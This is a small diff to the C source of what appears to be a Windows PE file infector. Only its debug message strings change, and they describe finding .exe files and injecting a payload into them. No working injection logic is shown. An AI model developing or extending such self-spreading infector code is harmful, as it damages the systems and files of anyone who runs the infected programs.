@@ -20,13 +20,13 @@ INJECTED_CODE VOID run_payload(IN CONST HMODULE hKernel32Dll, IN CONST PCBYTE pP
     INJECTED_VAR static CONST CHAR msgModuleName[] = "Current module name: ";
     INJECTED_VAR static CONST CHAR msgInjecting[] = "Injecting: ";
     INJECTED_VAR static CONST CHAR msgSkipping[] = "Skipping file: ";
-    INJECTED_VAR static CONST CHAR errGetModName[] = "Error getting module name";
-    INJECTED_VAR static CONST CHAR errGetDir[] = "Error getting current directory";
-    INJECTED_VAR static CONST CHAR errFindFile[] = "No .exe files";
-    INJECTED_VAR static CONST CHAR errOpenFile[] = "Error opening file";
-    INJECTED_VAR static CONST CHAR errMapFile[] = "Error mapping file";
-    INJECTED_VAR static CONST CHAR errNotPE[] = "Not a PE x64 file";
-    INJECTED_VAR static CONST CHAR errAlreadyInjected[] = "Payload already injected";
+    INJECTED_VAR static CONST CHAR errGetModName[] = "[!] Error getting module name";
+    INJECTED_VAR static CONST CHAR errGetDir[] = "[!] Error getting current directory";
+    INJECTED_VAR static CONST CHAR errFindFile[] = "[*] No .exe files";
+    INJECTED_VAR static CONST CHAR errOpenFile[] = "[!] Error opening file";
+    INJECTED_VAR static CONST CHAR errMapFile[] = "[!] Error mapping file";
+    INJECTED_VAR static CONST CHAR errNotPE[] = "> Not a PE x64 file";
+    INJECTED_VAR static CONST CHAR errAlreadyInjected[] = "> Payload already injected";
 #endif  // PL_DEBUG
 
     // Get module handles and function pointers
